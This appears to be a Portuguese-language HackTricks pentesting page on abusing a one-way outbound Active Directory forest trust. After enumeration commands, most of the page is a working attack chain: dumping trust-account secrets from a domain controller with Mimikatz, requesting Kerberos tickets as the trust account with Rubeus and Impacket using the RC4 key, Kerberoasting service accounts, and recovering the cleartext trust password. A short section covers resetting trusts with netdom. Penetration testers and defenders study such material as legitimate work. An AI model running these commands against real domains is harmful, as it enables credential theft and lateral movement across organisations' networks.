# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a principals de um **domínio/forest diferente**.

## Enumeração

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Se você tiver o módulo AD disponível, inspecione também diretamente o **Trusted Domain Object (TDO)**. Isso fornece os dados brutos de trust apoiados por LDAP que você precisará mais tarde ao decidir se o caminho mais fácil é **FSP/group abuse** ou **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Você também deve enumerar onde os principals estrangeiros de `CN=ForeignSecurityPrincipals` realmente receberam acesso. Ganhos comuns são:

- **Local admin** em um server/DC no seu domínio atual
- Membership em um **custom domain group** que tem ACLs sobre users/computers/GPOs
- Rights para modificar **computer objects**, que depois podem virar [RBCD](resource-based-constrained-delegation.md) se a configuração de trust permitir

## Trust Account Attack

Quando um one-way trust é criado de domain/forest **B** para domain/forest **A** (**B trusts A**), uma **trust account** para **B** é criada em **A**. Na visão de outbound-trust de **A**, isso é útil porque, se você comprometer depois **B** (o lado trusting), você pode extrair o trust secret lá e autenticar de volta para **A** como `B$`.

O aspecto crítico a entender aqui é que a password e o material Kerberos dessa trust account podem ser extraídos de um Domain Controller no domínio **trusting** usando:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Isso funciona porque a conta de trust criada no domínio **trusted** é um principal habilitado que acaba com os privilégios base de um usuário normal de domínio lá. Isso muitas vezes é suficiente para começar a enumerar LDAP, solicitar tickets e encontrar o próximo caminho de escalation.

Em um cenário em que `ext.local` é o domínio **trusting** e `root.local` é o domínio **trusted**, uma conta de usuário chamada `EXT$` é criada dentro de `root.local`. Fazer dump das trust keys de `ext.local` revela credentials que podem ser usadas como `root.local\EXT$` contra `root.local`:
```bash
lsadump::trust /patch
```
Seguindo isso, use a chave **RC4** extraída para autenticar como `root.local\EXT$` dentro de `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Então enumere o domínio confiável como aquele principal, por exemplo, fazendo Kerberoasting de um SPN de alto valor em `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Do Linux

Se você recuperou a chave da conta de confiança **RC4**, a mesma ideia funciona no Linux com Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Se **RC4** não for aceito, faça fallback para a **cleartext password** recuperada (ou para as chaves **AES** derivadas) e reutilize os fluxos usuais [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) e [Kerberoast](kerberoast.md) a partir desse foothold.

### Key material gotchas

Não confunda **trust keys** com **trust-account credentials**:

- Em uma one-way trust, ambos os lados armazenam um **TDO**, mas a **`EXT$` user account** real só existe no trusted domain.
- A trust-account password atual aparece no TDO trust secret (`NewPassword` / current trust key).
- A **RC4** trust key é o artefato mais fácil de reutilizar para `asktgt` como a trust account; em setups padrão, esse geralmente é o enctype funcional porque a trust account costuma ter um `msDS-SupportedEncryptionTypes` em branco.
- Se você estiver pensando em **AES trust keys**, lembre-se de que elas não são intercambiáveis com as AES keys da trust-account porque os salts são diferentes.

Então, para a technique desta página, prefira o material **RC4** extraído ou a **cleartext** password recuperada.

### Gathering cleartext trust password

No fluxo anterior, foi usado o trust hash em vez da **cleartext password** (que também é **dumped by mimikatz**).

A cleartext password pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo os null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Às vezes, ao criar uma trust relationship, uma password precisa ser digitada pelo usuário para a trust. Nesta demonstração, a key é a trust password original e, portanto, legível por humanos. À medida que a key gira (default: a cada 30 days), a cleartext normalmente deixa de ser legível por humanos, mas ainda continua tecnicamente utilizável.

A cleartext password pode ser usada para realizar autenticação normal como a trust account, como alternativa a solicitar um TGT com a Kerberos secret key da trust account. Aqui, consultando `root.local` a partir de `ext.local` para membros de `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts são principals estranhos. Logons interativos como **RUNAS / console / RDP** não são o caminho esperado aqui, e tentativas de autenticação **NTLM** podem falhar com `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Planeje usar **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) em vez disso.

### Persistence / cleanup note

Se os defenders perceberem que o trusting domain foi comprometido, eles devem rotacionar o trust secret em **ambos os lados** com `netdom trust ... /resetOneSide ...`. Do ponto de vista do operator, isso importa porque um **manual reset invalida imediatamente o old trust material**, enquanto a rotação normal da trust-password mantém os valores current/previous disponíveis durante o rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referências

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
